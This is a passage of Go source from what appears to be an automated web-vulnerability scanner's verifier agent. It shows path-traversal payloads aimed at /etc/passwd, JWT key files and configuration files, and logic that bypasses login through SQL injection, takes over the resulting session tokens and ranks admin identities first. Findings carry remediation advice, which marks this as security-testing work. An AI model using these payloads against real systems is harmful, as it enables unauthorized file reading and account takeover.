	case "file", "filename", "file_name", "filepath", "file_path", "path", "template", "name", "document", "resource":
		return true
	default:
		return false
	}
}

func fileReadTraversalBaselineValue(candidate fileReadTraversalCandidate) string {
	if strings.Contains(strings.ToLower(candidate.Path), "pathtraversal") {
		return "UserInfo.json"
	}
	return "index.html"
}

func fileReadTraversalPayloads(candidate fileReadTraversalCandidate) []fileReadTraversalPayload {
	payloads := []fileReadTraversalPayload{
		{Value: "secret.json", Description: "hidden same-directory secret file"},
		{Value: "./secret.json", Description: "dot-relative hidden secret file"},
		{Value: "secret.json\x00UserInfo.json", Description: "null-byte-truncated hidden secret file before allowed suffix"},
		{Value: "../JWT/SymmetricAlgoKeys.json", Description: "sibling JWT key material file"},
		{Value: "../SQLInjection/db/schema.sql", Description: "sibling SQL schema file"},
		{Value: "../../application.properties", Description: "application configuration file"},
		{Value: "../../../../../../etc/passwd", Description: "Unix account database"},
		{Value: "..%2fJWT%2fSymmetricAlgoKeys.json", Description: "URL-encoded sibling JWT key material file"},
		{Value: "..%252fJWT%252fSymmetricAlgoKeys.json", Description: "double-encoded sibling JWT key material file"},
	}
	if !strings.Contains(strings.ToLower(candidate.Path), "pathtraversal") {
		return payloads[2:]
	}
	return payloads
}

func (v *VerifierAgent) sendFileReadTraversalProbe(ctx context.Context, candidate fileReadTraversalCandidate, value string) (int, string, bool) {
	parsed, err := url.Parse(candidate.RawURL)
	if err != nil {
		return 0, "", false
	}
	q := parsed.Query()
	q.Set(candidate.ParamName, value)
	parsed.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, candidate.Method, parsed.String(), nil)
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (file-read traversal probe)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp.StatusCode, string(bodyBytes), true
}

func fileReadTraversalSignal(status int, body string, payload string, baselineStatus int, baselineBody string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	if body == "" || body == baselineBody {
		return ""
	}
	if strings.Contains(body, payload) && fileReadSensitiveContentSignal(body) == "" {
		return ""
	}
	signal := fileReadSensitiveContentSignal(body)
	if signal == "" {
		return ""
	}
	if strings.Contains(strings.ToLower(baselineBody), strings.ToLower(signal)) {
		return ""
	}
	return signal
}

func fileReadTraversalDisplayValue(value string) string {
	return strings.ReplaceAll(value, "\x00", "%00")
}

func fileReadSensitiveContentSignal(body string) string {
	lower := strings.ToLower(body)
	switch {
	case strings.Contains(lower, "dummy file") && strings.Contains(lower, "path traversal") && strings.Contains(lower, "password"):
		return "hidden secret file content"
	case strings.Contains(lower, "username") && strings.Contains(lower, "password"):
		return "credential-like JSON file content"
	case strings.Contains(lower, "algorithm") && strings.Contains(lower, "key") && strings.Contains(lower, "hs256"):
		return "JWT signing-key material"
	case strings.Contains(lower, "create table") && strings.Contains(lower, "varchar"):
		return "database schema file content"
	case strings.Contains(lower, "spring.") || strings.Contains(lower, "server.port") || strings.Contains(lower, "datasource"):
		return "application configuration file content"
	case strings.Contains(lower, "root:x:0:0") && strings.Contains(lower, "/bin"):
		return "Unix passwd file content"
	default:
		return ""
	}
}

func (v *VerifierAgent) storeFileReadTraversalFinding(candidate fileReadTraversalCandidate, payload fileReadTraversalPayload, baselineStatus int, baselineBody string, status int, body string, signal string) {
	key := strings.ToUpper(candidate.Method) + " " + candidate.Path
	profile := types.PageProfile{ID: key, URL: candidate.RawURL, Method: candidate.Method}
	v.storeFinding(profile, types.Finding{
		Title: fmt.Sprintf("Arbitrary file read/path traversal on %s via %s", candidate.Path, candidate.ParamName),
		Description: fmt.Sprintf("%s %s read %s through `%s=%s`. Baseline status was %d; payload status was %d. Signal: %s.",
			candidate.Method, candidate.Path, payload.Description, candidate.ParamName, fileReadTraversalDisplayValue(payload.Value), baselineStatus, status, signal),
		Severity:   types.SeverityHigh,
		Confidence: types.ConfidenceConfirmed,
		EndpointID: key,
		VulnType:   "path_traversal",
		ParamName:  candidate.ParamName,
		Payload:    fileReadTraversalDisplayValue(payload.Value),
		PocRequest: fmt.Sprintf("%s %s?%s=%s HTTP/1.1\nHost: <target>\n",
			candidate.Method, candidate.Path, candidate.ParamName, url.QueryEscape(payload.Value)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 700)),
		StepsToReproduce: fmt.Sprintf("1. Send baseline: %s %s?%s=%s.\n2. Send payload: %s %s?%s=%s.\n3. Observe %s in the response.",
			candidate.Method, candidate.Path, candidate.ParamName, fileReadTraversalBaselineValue(candidate),
			candidate.Method, candidate.Path, candidate.ParamName, fileReadTraversalDisplayValue(payload.Value), signal),
		Impact:      "Attackers can read hidden application files, sibling resource files, configuration, keys, source/schema material, or OS files depending on the deployment and filter bypass.",
		Remediation: "Do not concatenate user-controlled filenames into filesystem paths. Resolve the requested file against a fixed base directory, canonicalize it, require it to remain inside that directory, and map user-visible choices to server-side file IDs instead of raw paths.",
		Evidence:    fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nSignal: %s\nBaseline status: %d\nBaseline body: %s\nPayload status: %d\nPayload body: %s", candidate.RawURL, candidate.ParamName, fileReadTraversalDisplayValue(payload.Value), signal, baselineStatus, truncateString(baselineBody, 300), status, truncateString(body, 500)),
	})
}

func observedErrorPathEligible(path, contentType string) bool {
	lowerPath := strings.ToLower(path)
	if strings.Contains(lowerPath, "socket.io") ||
		strings.Contains(lowerPath, "/assets/i18n/") ||
		strings.HasSuffix(lowerPath, ".js") ||
		strings.HasSuffix(lowerPath, ".css") ||
		strings.HasSuffix(lowerPath, ".png") ||
		strings.HasSuffix(lowerPath, ".jpg") ||
		strings.HasSuffix(lowerPath, ".jpeg") ||
		strings.HasSuffix(lowerPath, ".gif") ||
		strings.HasSuffix(lowerPath, ".svg") {
		return false
	}
	ctLower := strings.ToLower(contentType)
	return ctLower == "" || strings.Contains(ctLower, "html") || strings.Contains(ctLower, "json") || strings.Contains(ctLower, "text")
}

func stackTraceSignalHits(body string) (int, string) {
	lower := strings.ToLower(body)
	signals := []string{
		"at /app/",
		"at object.",
		"node_modules/",
		"sequelize",
		"at module._",
		"at process.",
		".js:",
		"referenceerror",
		"typeerror",
		"syntaxerror",
		"unauthorizederror",
		"unexpected path",
		"unhandledpromiserejection",
	}
	hits := 0
	first := ""
	for _, sig := range signals {
		if strings.Contains(lower, sig) {
			hits++
			if first == "" {
				first = sig
			}
		}
	}
	return hits, first
}

func (v *VerifierAgent) probeOrphanI18nBundles(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}

	bases := make(map[string]struct{})
	catalogKeys := make(map[string]struct{})
	for _, entry := range entries {
		if base := i18nBundleBasePath(entry.Request.Path); base != "" {
			bases[base] = struct{}{}
		}
		if len(entry.Response.Body) > 0 && i18nLanguageCatalogPath(entry.Request.Path) {
			for _, key := range i18nLanguageCatalogKeys(string(entry.Response.Body)) {
				catalogKeys[strings.ToLower(key)] = struct{}{}
			}
		}
	}
	if len(bases) == 0 {
		return
	}

	candidates := orphanI18nCandidateKeys(catalogKeys)
	for basePath := range bases {
		for _, key := range candidates {
			if ctx.Err() != nil {
				return
			}
			lowerKey := strings.ToLower(key)
			if _, ok := catalogKeys[lowerKey]; ok {
				continue
			}
			path := basePath + key + ".json"
			u := strings.TrimRight(target, "/") + path
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil || resp.StatusCode != 200 {
				continue
			}
			v.tested++
			if !looksLikeI18nBundleJSON(resp.Header.Get("Content-Type"), body) {
				v.dismissed++
				continue
			}
			v.confirmed++
			v.storeOrphanI18nBundleFinding(key, path, u, resp.StatusCode, resp.Header.Get("Content-Type"), body, len(catalogKeys))
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s exposes an unadvertised i18n bundle (%s) outside the public language catalogue.", path, key),
				u, nil)
			return
		}
	}
}

func (v *VerifierAgent) storeOrphanI18nBundleFinding(key, path, rawURL string, status int, contentType, body string, catalogCount int) {
	profile := types.PageProfile{ID: "GET " + path, URL: rawURL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:            fmt.Sprintf("Unadvertised translation bundle exposed: %s", path),
		Description:      fmt.Sprintf("The application exposes an i18n asset directory and a public language catalogue, but unauthenticated GET %s returned a valid translation JSON bundle for key %q that was not present in the advertised catalogue (%d known keys). Hidden/test/fantasy locale bundles can reveal unreleased UI strings, feature names, or internal copy.", path, key, catalogCount),
		Severity:         types.SeverityLow,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       "GET " + path,
		VulnType:         "info_disclosure",
		Payload:          "(no payload — direct GET)",
		PocRequest:       fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", path),
		PocResponse:      fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", status, contentType, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf("1. Observe the public language catalogue and i18n bundle path.\n2. Confirm that key %q is not listed in the catalogue.\n3. GET %s unauthenticated.\n4. Observe that a valid translation JSON bundle is served.", key, path),
		Impact:           "Attackers can enumerate hidden or pre-production UI strings and feature labels, which often disclose unreleased functionality, internal workflow names, or additional routes to investigate.",
		Remediation:      "Serve only advertised production translation bundles from public assets. Remove test/fantasy/internal locale files from production builds or gate non-production assets behind authentication.",
		Evidence:         fmt.Sprintf("URL: %s\nStatus: %d\nCatalogue entries observed: %d\nUnadvertised key: %s\nBody preview: %s", rawURL, status, catalogCount, key, truncateString(body, 400)),
	})
}

func i18nBundleBasePath(path string) string {
	path = strings.TrimSpace(path)
	if path == "" {
		return ""
	}
	if parsed, err := url.Parse(path); err == nil && parsed.Path != "" {
		path = parsed.Path
	}
	lower := strings.ToLower(path)
	idx := strings.LastIndex(lower, "/i18n/")
	if idx < 0 || !strings.HasSuffix(lower, ".json") {
		return ""
	}
	base := path[:idx+len("/i18n/")]
	name := path[idx+len("/i18n/"):]
	if strings.Contains(name, "/") {
		return ""
	}
	key := strings.TrimSuffix(name, path[strings.LastIndex(path, "."):])
	if !i18nBundleKeyLooksLocale(key) {
		return ""
	}
	return base
}

func i18nLanguageCatalogPath(path string) bool {
	path = strings.TrimSpace(path)
	if parsed, err := url.Parse(path); err == nil && parsed.Path != "" {
		path = parsed.Path
	}
	lower := strings.ToLower(path)
	return strings.HasSuffix(lower, "/rest/languages") ||
		strings.HasSuffix(lower, "/api/languages") ||
		strings.HasSuffix(lower, "/languages")
}

func i18nLanguageCatalogKeys(body string) []string {
	var arr []map[string]any
	if err := json.Unmarshal([]byte(body), &arr); err != nil {
		return nil
	}
	seen := make(map[string]struct{})
	var out []string
	for _, obj := range arr {
		raw, ok := obj["key"].(string)
		if !ok || !i18nBundleKeyLooksLocale(raw) {
			continue
		}
		key := strings.TrimSpace(raw)
		lower := strings.ToLower(key)
		if _, ok := seen[lower]; ok {
			continue
		}
		seen[lower] = struct{}{}
		out = append(out, key)
	}
	return out
}

func orphanI18nCandidateKeys(catalogKeys map[string]struct{}) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(key string) {
		key = strings.TrimSpace(key)
		if !i18nBundleKeyLooksLocale(key) {
			return
		}
		lower := strings.ToLower(key)
		if _, ok := seen[lower]; ok {
			return
		}
		seen[lower] = struct{}{}
		out = append(out, key)
	}
	for _, key := range []string{
		"tlh_AA", "tlh", "en_XA", "en_XB", "xx_XX", "zz_ZZ",
		"pirate", "debug", "test", "dev", "qa",
	} {
		add(key)
	}
	if _, ok := catalogKeys["en"]; ok {
		add("en_US")
		add("en_GB")
	}
	return out
}

func i18nBundleKeyLooksLocale(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) < 2 || len(key) > 20 {
		return false
	}
	for _, r := range key {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '-' {
			continue
		}
		return false
	}
	return true
}

func looksLikeI18nBundleJSON(contentType, body string) bool {
	if strings.TrimSpace(body) == "" {
		return false
	}
	lowerCT := strings.ToLower(contentType)
	lowerBody := strings.ToLower(body)
	if strings.Contains(lowerCT, "text/html") ||
		strings.Contains(lowerBody, "<!doctype html") ||
		strings.Contains(lowerBody, "<html") {
		return false
	}
	var obj map[string]any
	if err := json.Unmarshal([]byte(body), &obj); err != nil || len(obj) == 0 {
		return false
	}
	if _, ok := obj["LANGUAGE"]; ok {
		return true
	}
	hits := 0
	for key, value := range obj {
		if strings.ToUpper(key) == key && strings.Contains(key, "_") {
			if _, ok := value.(string); ok {
				hits++
			}
		}
		if hits >= 3 {
			return true
		}
	}
	return strings.Contains(lowerCT, "json") && len(obj) >= 8
}

// probeOutdatedVersion pulls the target's advertised version (via common
// disclosure endpoints and response headers) and compares it against a
// small list of known-vulnerable pins. Emits a Finding if the advertised
// version matches a known-public-CVE release or if the target self-identifies
// as a deliberately-vulnerable training app (e.g. OWASP Juice Shop).
//
// This is a narrow, low-false-positive probe: we only flag versions we can
// point at a published advisory for. Generic "Server: nginx" disclosure is
// deliberately out of scope — that's noise, not a vulnerability.
func (v *VerifierAgent) probeOutdatedVersion(ctx context.Context, target string) {
	// Paths come from the industry-standard corpus (common across
	// frameworks regardless of application domain). No per-app knowledge.
	rawPaths := corpus.VersionDisclosurePaths()
	versionPaths := make([]string, 0, len(rawPaths))
	for _, p := range rawPaths {
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		versionPaths = append(versionPaths, p)
	}

	for _, path := range versionPaths {
		if ctx.Err() != nil {
			return
		}
		u := target + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			continue
		}
		v.tested++

		version := extractVersionString(body)
		if version == "" {
			v.dismissed++
			continue
		}

		finding, match := evaluateVersionKnownVulns(path, version, body)
		if !match {
			v.dismissed++
			continue
		}
		v.confirmed++

		pocReq := fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", path)
		pocResp := fmt.Sprintf("HTTP/1.1 %d\n\n%s", resp.StatusCode, truncateString(body, 400))

		profile := types.PageProfile{
			ID:     "GET " + path,
			URL:    u,
			Method: "GET",
		}
		f := finding
		f.EndpointID = "GET " + path
		f.PocRequest = pocReq
		f.PocResponse = pocResp
		f.Evidence = fmt.Sprintf(
			"URL: %s\nStatus: %d\nDetected version: %s\nBody: %s",
			u, resp.StatusCode, version, truncateString(body, 400))
		v.storeFinding(profile, f)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Outdated/vulnerable component: %s reports version %s", path, version),
			u, nil)
		return // one version finding is enough per scan — they all point at the same app
	}
}

// versionRegex matches a semver-looking token: "14.5.0", "v14.5.0",
// optionally with a trailing pre-release suffix ("-beta.1"). Anchored
// loose so it matches inside JSON ("version":"14.5.0") and freeform bodies.
var versionRegex = regexp.MustCompile(`v?(\d+\.\d+\.\d+(?:-[A-Za-z0-9.]+)?)`)

// extractVersionString pulls the first semver-looking token from a body.
func extractVersionString(body string) string {
	m := versionRegex.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

// evaluateVersionKnownVulns checks a detected version against a small list
// of known-vulnerable pins. Returns a populated Finding if matched, else
// (zero, false). Deliberately conservative — unknown apps are not flagged
// just because they disclose a version.
func evaluateVersionKnownVulns(path, version, body string) (types.Finding, bool) {
	lower := strings.ToLower(body)

	// OWASP Juice Shop — any disclosed version is a finding because the app
	// is deliberately-vulnerable training software. Detection combines path
	// (the Juice Shop-specific version endpoint) and body hints.
	isJuice := strings.Contains(path, "/rest/admin/application-version") ||
		strings.Contains(lower, "juice") ||
		strings.Contains(lower, "owasp-juice")

	if isJuice {
		return types.Finding{
			Title: fmt.Sprintf("Outdated/vulnerable component: OWASP Juice Shop %s", version),
			Description: fmt.Sprintf(
				"The application advertises itself as OWASP Juice Shop version %s via %s. "+
					"Juice Shop is a deliberately-vulnerable training application — every deployed "+
					"instance ships with dozens of known security bugs. Exposing the version "+
					"publicly also lets any attacker consult the full challenge catalogue and "+
					"select high-impact issues to reproduce.",
				version, path),
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			VulnType:   "vulnerable_component",
			Payload:    "(no payload — direct GET)",
			StepsToReproduce: fmt.Sprintf(
				"1. Send an unauthenticated GET to %s.\n"+
					"2. Observe the response discloses Juice Shop version %s.\n"+
					"3. Consult the OWASP Juice Shop CHANGELOG / challenge list for known issues in that release.",
				path, version),
			Impact: "Attackers can identify the application, enumerate applicable CVEs / " +
				"publicly-documented challenges, and tailor exploits against it without ever " +
				"probing blind.",
			Remediation: "Disable the version disclosure endpoint or gate it behind authentication. " +
				"Track and apply security updates promptly. If this host is used for training, " +
				"restrict network access so it cannot be reached by unintended parties.",
		}, true
	}

	// Express pre-3.x disclosure — well-past end-of-life with published CVEs.
	parts := strings.Split(version, ".")
	major := 0
	if len(parts) >= 1 {
		fmt.Sscanf(parts[0], "%d", &major)
	}
	if major > 0 && major < 3 && strings.Contains(lower, "express") {
		return types.Finding{
			Title: fmt.Sprintf("Outdated component: Express %s (pre-3.0, end-of-life)", version),
			Description: fmt.Sprintf(
				"The application advertises Express version %s. Express releases prior to 3.0 "+
					"are end-of-life and have multiple published CVEs (XSS, request-smuggling, "+
					"denial-of-service).", version),
			Severity:         types.SeverityMedium,
			Confidence:       types.ConfidenceConfirmed,
			VulnType:         "vulnerable_component",
			Payload:          "(no payload — direct GET)",
			StepsToReproduce: fmt.Sprintf("1. GET %s.\n2. Observe Express %s disclosed.", path, version),
			Impact:           "Framework is unmaintained; published CVEs apply directly.",
			Remediation:      "Upgrade to a currently-supported Express release.",
		}, true
	}

	return types.Finding{}, false
}

// resolveTargetBase looks up the scan's target URL and returns it with any
// trailing slash stripped so we can concat paths cleanly.
func (v *VerifierAgent) resolveTargetBase() string {
	var target string
	if err := v.db.Conn().QueryRow(
		`SELECT target FROM scans WHERE id = ?`, v.scanID).Scan(&target); err != nil {
		return ""
	}
	target = strings.TrimRight(target, "/")
	if !strings.HasPrefix(strings.ToLower(target), "http") {
		return ""
	}
	return target
}

// endpointExists fires a quick probe (HEAD for GET endpoints, OPTIONS for
// POST) to decide whether the path is worth pursuing. Returns true even on
// 401/403/405 — the endpoint exists, it just doesn't let us in unauth.
func (v *VerifierAgent) endpointExists(ctx context.Context, rawURL, method string) bool {
	probeMethod := "HEAD"
	if method == "POST" {
		probeMethod = "OPTIONS"
	}
	req, err := http.NewRequestWithContext(ctx, probeMethod, rawURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return false
	}
	resp.Body.Close()
	// 404 → doesn't exist. Anything else → exists (including 405 Method
	// Not Allowed which Juice Shop returns for HEAD on /rest/user/login).
	return resp.StatusCode != 404
}

// proactiveGET is a bounded GET helper used by the proactive-probe pass.
// Returns the response, body, and capture-style header map.
func (v *VerifierAgent) proactiveGET(ctx context.Context, rawURL string) (*http.Response, string, map[string]string, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return nil, "", nil, err
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (proactive probe)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return nil, "", nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	hdrs := make(map[string]string, len(req.Header))
	for k, vs := range req.Header {
		if len(vs) > 0 {
			hdrs[k] = vs[0]
		}
	}
	return resp, string(body), hdrs, nil
}

func (v *VerifierAgent) proactiveGETWithHeaders(ctx context.Context, rawURL string, headers map[string]string, userAgent string) (*http.Response, string, map[string]string, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return nil, "", nil, err
	}
	if strings.TrimSpace(userAgent) == "" {
		userAgent = "AOBTD/Verifier (authenticated proactive probe)"
	}
	req.Header.Set("User-Agent", userAgent)
	for k, val := range headers {
		lower := strings.ToLower(strings.TrimSpace(k))
		if lower == "" || lower == "host" || lower == "content-length" {
			continue
		}
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return nil, "", nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	hdrs := make(map[string]string, len(req.Header))
	for k, vs := range req.Header {
		if len(vs) > 0 {
			hdrs[k] = vs[0]
		}
	}
	return resp, string(body), hdrs, nil
}

func (v *VerifierAgent) proactiveGETWithObservedAuth(ctx context.Context, rawURL string) (*http.Response, string, map[string]string, string, error) {
	headers, source, err := v.db.BestCredentialHeaders(v.scanID, rawURL)
	if err != nil || len(headers) == 0 {
		return nil, "", nil, source, err
	}
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return nil, "", nil, source, err
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (authenticated proactive probe)")
	for k, val := range headers {
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return nil, "", nil, source, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	hdrs := make(map[string]string, len(req.Header))
	for k, vs := range req.Header {
		if len(vs) > 0 {
			hdrs[k] = vs[0]
		}
	}
	return resp, string(body), hdrs, source, nil
}

// isLoginLikeEndpoint returns true for URLs that look like authentication
// submission endpoints. Used to decide whether to use login-bypass SQLi
// patterns (targeting email+password JSON body) vs. generic query-param
// SQLi. Conservative: only matches obvious auth paths with POST.
func isLoginLikeEndpoint(rawURL, method string) bool {
	if !strings.EqualFold(method, "POST") {
		return false
	}
	lower := strings.ToLower(rawURL)
	for _, pat := range []string{
		"/rest/user/login", "/api/auth/login", "/api/login",
		"/login", "/signin", "/sign-in", "/auth/token",
	} {
		if strings.Contains(lower, pat) {
			return true
		}
	}
	return false
}

// verifyLoginSQLi tries classic login-bypass SQLi payloads against a
// POST /rest/user/login-style endpoint. Returns true if bypass was
// confirmed. Detection signals:
//   - HTTP 200 response (vs baseline 401/403)
//   - Response body contains a session token / JWT / "authentication"
//     field, indicating auth succeeded with the attack payload
type loginSQLiPayload struct {
	email          string
	password       string
	label          string
	targetIdentity string
}

func (v *VerifierAgent) verifyLoginSQLi(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry) bool {
	identityField, passwordField := loginSQLiCredentialFields(entry)
	// Snapshot a baseline: send the original request (or a plausible bogus
	// one) and see what the server does for invalid credentials.
	baselineBody, baselineStatus, baselineAuthSignal := v.sendLoginAttempt(ctx, entry.Request.URL,
		identityField, passwordField, "aobtd-nonexistent-user@example.com", "wrong-password-12345", entry.Request.Headers)

	identities := v.loginSQLiIdentityCandidates(ctx, entry, 12)
	seenPayloads := make(map[string]bool)
	payloads := appendNewLoginSQLiPayloads(nil, loginSQLiPayloadsForIdentities(identities), seenPayloads)
	if len(identities) > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "observed",
			fmt.Sprintf("Harvested %d candidate login identity value(s) for bounded SQLi bypass probes.", len(identities)),
			entry.Request.URL, map[string]any{"identity_count": len(identities)})
	}

	storedFinding := false
	postAuthIdentityHarvested := false
	promotedTokens := make(map[string]bool)
	bestPromotedPrivilegePriority := 0
	for i := 0; i < len(payloads); i++ {
		p := payloads[i]
		if ctx.Err() != nil {
			return storedFinding
		}
		body, status, authSignal := v.sendLoginAttempt(ctx, entry.Request.URL,
			identityField, passwordField, p.email, p.password, entry.Request.Headers)
		if status != 200 {
			continue
		}
		// 200 alone is not enough. The response must carry a concrete
		// token/session artifact, not just an HTML shell that mentions an
		// authentication service name.
		if authSignal == "" {
			continue
		}
		if baselineAuthSignal != "" && authSignal == baselineAuthSignal &&
			status == baselineStatus && approxSameResponseSize(len(body), len(baselineBody)) {
			v.db.InsertNarration(v.scanID, "verifier", "dismissed",
				fmt.Sprintf("Login SQLi payload %s produced the same auth-looking signal as the bogus baseline (%s); treating it as a session-cookie/login-shell false positive.",
					p.label, authSignal),
				entry.Request.URL, map[string]any{
					"payload_label": p.label,
					"auth_signal":   authSignal,
					"status":        status,
				})
			continue
		}
		token := extractAuthTokenFromJSON([]byte(body))
		if !postAuthIdentityHarvested {
			postAuthIdentityHarvested = true
			if token != "" {
				extraIdentities := v.loginSQLiIdentityCandidatesFromAuthenticatedEndpoints(ctx, entry.Request.URL, token, 16)
				before := len(payloads)
				payloads = appendNewLoginSQLiPayloads(payloads, loginSQLiPayloadsForIdentities(extraIdentities), seenPayloads)
				if added := len(payloads) - before; added > 0 {
					v.db.InsertNarration(v.scanID, "verifier", "observed",
						fmt.Sprintf("Login bypass yielded a token; harvested %d additional authenticated identity candidate(s) and queued %d follow-up SQLi replay payload(s).",
							len(extraIdentities), added),
						entry.Request.URL, map[string]any{"identity_count": len(extraIdentities), "new_payloads": added})
				}
			}
		}
		identity := firstNonBlank(p.targetIdentity, p.email)
		promotionPriority := loginSQLiBrowserPromotionPriority(identity, len(promotedTokens) == 0)
		shouldPromote := promotionPriority == 1 || promotionPriority > bestPromotedPrivilegePriority
		if token != "" && !promotedTokens[token] && shouldPromote {
			promotedTokens[token] = true
			if promotionPriority > 1 {
				bestPromotedPrivilegePriority = promotionPriority
			}
			v.promoteBrowserSessionFromAuthResponse(ctx, entry.Request.URL, []byte(body), identity,
				fmt.Sprintf("SQL injection login bypass (%s)", p.label))
		}
		if storedFinding {
			v.db.InsertNarration(v.scanID, "verifier", "observed",
				fmt.Sprintf("Login SQLi bypass also accepted candidate identity %s with payload %s.", identity, p.label),
				entry.Request.URL, map[string]any{
					"payload_label":   p.label,
					"target_identity": p.targetIdentity,
					"status":          status,
				})
			continue
		}
		v.confirmed++

		pocBody := mustJSON(map[string]any{identityField: p.email, passwordField: p.password})
		pocReq := buildRawPOSTRequest(entry.Request.URL, "application/json", []byte(pocBody), entry.Request.Headers)
		pocResp := fmt.Sprintf("HTTP/1.1 %d OK\n\n%s", status, truncateString(body, 800))

		steps := fmt.Sprintf(
			"1. Observe that %s accepts %s + %s as JSON body.\n"+
				"2. Send the request with %s set to `%s` (%s is irrelevant):\n\n%s\n\n"+
				"3. The server returns HTTP 200 with an auth token or session cookie, confirming the WHERE clause was short-circuited by the injected SQL.",
			entry.Request.Path, identityField, passwordField, identityField, p.email, passwordField, pocReq)

		impact := "Full authentication bypass — any attacker can log in as any user (or at least as the one whose email contains the leaked predicate) WITHOUT knowing the password. " +
			"Combined with admin accounts, this is instant account takeover."

		remediation := "Parameterize the login query. Never concatenate email/password strings into SQL. " +
			"As defense in depth, add a WAF rule for `--`, `OR 1=1`, and `'--` in credential fields; rate-limit the login endpoint."

		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("SQL injection login bypass on %s (payload: %s)",
				entry.Request.Path, p.label),
			Description: fmt.Sprintf("Sending %s=`%s` %s=`%s` to %s returns HTTP 200 with a concrete auth signal (%s). The baseline request with a bogus user returned HTTP %d. The server is constructing the authentication query by string concatenation, allowing tautology-based bypass.",
				identityField, p.email, passwordField, p.password, entry.Request.Path, authSignal, baselineStatus),
			Severity:         types.SeverityCritical,
			Confidence:       types.ConfidenceConfirmed,
			VulnType:         "sqli",
			ParamName:        identityField,
			Payload:          p.email,
			PocRequest:       pocReq,
			PocResponse:      pocResp,
			StepsToReproduce: steps,
			Impact:           impact,
			Remediation:      remediation,
			Evidence: fmt.Sprintf("Payload: %s=%s %s=%s\nBaseline status: %d (bogus user)\nAttack status: %d\nAuth success signal: %s\nResponse length: %d bytes (baseline: %d)",
				identityField, p.email, passwordField, p.password, baselineStatus, status, authSignal, len(body), len(baselineBody)),
		})
		v.db.LogAIWithMetrics(v.scanID, "verifier", "login_sqli_confirmed",
			fmt.Sprintf("%s payload:%s", profile.ID, p.label),
			"", entry.Request.URL, p.email, 0, 0, 0)
		storedFinding = true
	}
	return storedFinding
}

func loginSQLiShouldPromoteBrowserSession(identity string, firstAccepted bool) bool {
	return loginSQLiBrowserPromotionPriority(identity, firstAccepted) > 0
}

func loginSQLiBrowserPromotionPriority(identity string, firstAccepted bool) int {
	identity = strings.ToLower(strings.TrimSpace(identity))
	if firstAccepted {
		return 1
	}
	if identity == "" {
		return 0
	}
	for _, marker := range []string{
		"admin", "administrator", "root", "superuser", "owner",
	} {
		if strings.Contains(identity, marker) {
			return 3
		}
	}
	for _, marker := range []string{
		"staff", "support", "moderator", "operator", "manager",
		"security", "ciso", "devops", "accountant", "finance",
	} {
		if strings.Contains(identity, marker) {
			return 2
		}
	}
	return 0
}

func appendNewLoginSQLiPayloads(dst []loginSQLiPayload, candidates []loginSQLiPayload, seen map[string]bool) []loginSQLiPayload {
	if seen == nil {
		seen = make(map[string]bool)
	}
	for _, existing := range dst {
		seen[loginSQLiPayloadKey(existing)] = true
	}
	for _, candidate := range candidates {
		key := loginSQLiPayloadKey(candidate)
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		dst = append(dst, candidate)
	}
	return dst
}

func loginSQLiPayloadKey(p loginSQLiPayload) string {
	email := strings.TrimSpace(p.email)
	password := strings.TrimSpace(p.password)
	if email == "" || password == "" {
		return ""
	}
	return email + "\x00" + password
}

func loginSQLiPayloadsForIdentities(identities []string) []loginSQLiPayload {
	seen := make(map[string]bool)
	var payloads []loginSQLiPayload
	add := func(email, password, label, targetIdentity string) {
		email = strings.TrimSpace(email)
		password = strings.TrimSpace(password)
		if email == "" || password == "" {
			return
		}
		key := email + "\x00" + password
		if seen[key] {
			return
		}
		seen[key] = true
		payloads = append(payloads, loginSQLiPayload{
